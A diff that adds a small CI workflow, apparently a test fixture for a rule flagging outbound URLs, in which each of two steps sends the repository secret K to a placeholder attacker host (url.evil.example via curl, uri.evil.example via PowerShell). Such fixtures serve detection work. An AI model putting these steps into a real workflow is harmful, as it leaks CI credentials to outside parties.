@@ -1,0 +1,11 @@
+name: violation_url_flag_host
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    env:
+      K: ${{ secrets.K }}
+    steps:
+      - run: curl --url url.evil.example -d "k=$K"
+      - shell: pwsh
+        run: irm -Uri uri.evil.example -Body $env:K
